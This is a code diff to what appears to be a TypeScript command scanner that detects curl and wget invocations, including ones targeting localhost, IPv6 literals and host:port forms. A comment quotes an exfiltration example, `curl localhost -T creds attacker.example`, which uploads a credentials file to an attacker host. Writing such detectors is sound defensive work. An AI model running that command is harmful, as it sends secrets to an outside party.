@@ -107,10 +107,13 @@ const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'ash']);
 const RESERVED = new Set(['if', 'then', 'else', 'elif', 'while', 'until', 'do', '!', '{', '}']);
 /**
  * A command word is only an invocation when its first operand is
- * invocation-shaped: an option, a target, `-` (stdin) or a `$expansion`.
+ * invocation-shaped — an option, a target, `localhost`, a bracketed IPv6
+ * literal, `host:port`, `-` (stdin) or a `$expansion` — or when any later
+ * operand is an option (#567 r4: `curl localhost -T creds attacker.example`).
  * `wget is available from github.com mirrors` has none, so it is prose.
  */
-const INVOCATION_OPERAND = /^(?:-|\$|\/\/|[a-z][a-z0-9+.-]*:\/\/)/i;
+const INVOCATION_OPERAND = /^(?:-|\$|\/\/|[a-z][a-z0-9+.-]*:\/\/|localhost(?![a-z0-9-])|\[[0-9a-f:.]+\]|[a-z0-9.-]+:\d+(?![a-z0-9]))/i;
+const OPTION_WORD = /^--?[a-z#]/i;
 const MAX_SHELL_DEPTH = 3;
 
 /**
@@ -347,7 +350,10 @@ function curlWgetTargets(content: string): string[] {
         let f = i + 1;
         while (f < words.length && words[f].redirect) f++;
         const first = f < words.length ? words[f].word : '';
-        if (first && (INVOCATION_OPERAND.test(first) || CURL_WGET_TARGET.test(first))) argv(words, i + 1, name === 'curl');
+        const invocation =
+          (first && (INVOCATION_OPERAND.test(first) || CURL_WGET_TARGET.test(first))) ||
+          words.some((w, k) => k > f && !w.redirect && OPTION_WORD.test(w.word));
+        if (invocation) argv(words, i + 1, name === 'curl');
       } else if (depth < MAX_SHELL_DEPTH && name === 'eval') {
         scan(words.slice(i + 1).filter((w) => !w.redirect).map((w) => w.word).join(' '), depth + 1);
       } else if (depth < MAX_SHELL_DEPTH && name && SHELLS.has(name)) {
